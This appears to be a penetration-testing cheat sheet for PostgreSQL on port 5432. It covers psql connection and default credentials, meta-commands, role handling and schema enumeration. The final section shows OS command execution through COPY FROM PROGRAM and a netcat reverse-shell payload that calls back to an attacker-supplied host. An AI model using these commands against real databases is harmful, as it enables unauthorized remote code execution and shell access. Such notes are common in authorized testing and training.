## TCP 5432 Postgresql  

### Connecting to the database
`psql -h HOST/IP -p PORT -U USER`  

Default username and database are both `postgres`   


### Postgres Commands  
```
Some interesting flags (to see all, use -h or --help depending on your psql version):

-E: will describe the underlaying queries of the \ commands (cool for learning!)
-l: psql will list all databases and then exit (useful if the user you connect with doesn’t has a default database, like at AWS RDS)
Most \d commands support additional param of __schema__.name__ and accept wildcards like *.*

\q: Quit/Exit
\c __database__: Connect to a database
\d __table__: Show table definition (columns, etc.) including triggers
\d+ __table__: More detailed table definition including description and physical disk size
\l: List databases
\dy: List events
\df: List functions
\di: List indexes
\dn: List schemas
\dt *.*: List tables from all schemas (if *.* is omitted will only show SEARCH_PATH ones)
\dT+: List all data types
\dv: List views
\dx: List all extensions installed
\df+ __function__ : Show function SQL code.
\x: Pretty-format query results instead of the not-so-useful ASCII tables
\copy (SELECT * FROM __table_name__) TO 'file_path_and_name.csv' WITH CSV: Export a table as CSV
\des+: List all foreign servers
\dE[S+]: List all foreign tables

# User Related:
\du: List users
\du __username__: List a username if present.
create role __test1__: Create a role with an existing username.
create role __test2__ noinherit login password __passsword__;: Create a role with username and password.
set role __test__;: Change role for current session to __test__.
grant __test2__ to __test1__;: Allow __test1__ to set its role as __test2__.
\deu+: List all user mapping on server

# show version
show version();

# Comment
--comment
or
/*comment*/

# Enumerating db contents
# Listing the tables
SELECT * FROM information_schema.tables
or
SELECT TABLE_NAME FROM information_schema.tables

# Listing columns
SELECT * FROM information_schema_columns WHERE table_name = 'TABLE_NAME'
or
SELECT column_name FROM information_schema_columns WHERE table_name = 'TABLE_NAME'
```
 
### Command Execution in Postgresql  >= 9.3

```
DROP TABLE IF EXISTS cmd_exec;  
CREATE TABLE cmd_exec(cmd_output text);  
COPY cmd_exec FROM PROGRAM 'COMMAND';  
SELECT * FROM cmd_exec;  
```
<i>COMMAND</i> is the command to pass onto the operating system.  
Output of the command is shown after execution of the final SELECT command.  

**For reverse shell**:  
```
DROP TABLE IF EXISTS cmd_exec;  
CREATE TABLE cmd_exec(cmd_output text);  
COPY cmd_exec FROM PROGRAM 'nc HOST/IP PORT -e /bin/sh & 2>/dev/null'; 
SELECT * FROM cmd_exec;  
```
*references*  
[PostgreSQL: Commands Cheat Sheet](https://simplecheatsheet.com/postgresql-commands/#:~:text=PostgreSQL%3A%20Commands%20Cheat%20Sheet%201%20%5Cq%3A%20Quit%2FExit%202,List%20functions%208%20%5Cdi%3A%20List%20indexes%20More%20items)
